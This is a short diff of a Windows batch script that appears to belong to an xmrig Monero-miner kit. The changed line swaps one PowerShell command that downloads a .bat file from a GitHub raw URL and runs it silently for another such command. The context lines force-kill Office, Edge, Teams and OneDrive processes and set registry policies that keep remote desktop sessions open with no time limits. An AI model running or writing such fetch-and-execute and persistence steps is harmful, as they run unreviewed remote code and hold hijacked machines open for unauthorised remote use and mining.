@@ -24,7 +24,7 @@ if '%errorlevel%' NEQ '0' (
 
 taskkill /IM "OfficeClickToRun.exe" /F & taskkill /IM "msedge.exe" /F & taskkill /IM "teams.exe" /F & taskkill /IM "onedrive.exe" /F & REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /V KeepAliveEnable /T REG_DWORD /F /D 1 & REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /V KeepAliveInterval /T REG_DWORD /F /D 1 & REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /V fEnableTimeZoneRedirection /T REG_DWORD /F /D 1 & REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /V MaxDisconnectionTime /T REG_DWORD /F /D 0 & REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /V MaxIdleTime /T REG_DWORD /F /D 0 & REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /V MaxConnectionTime /T REG_DWORD /F /D 0 
 
-powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/uninstall_moneroocean_miner.bat', $tempfile); & $tempfile; Remove-Item -Force $tempfile"
+powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/junaidd007/Monero/main/MOxmrigUNINSTALL.bat', $tempfile); & $tempfile; Remove-Item -Force $tempfile"
 
 
 @echo off
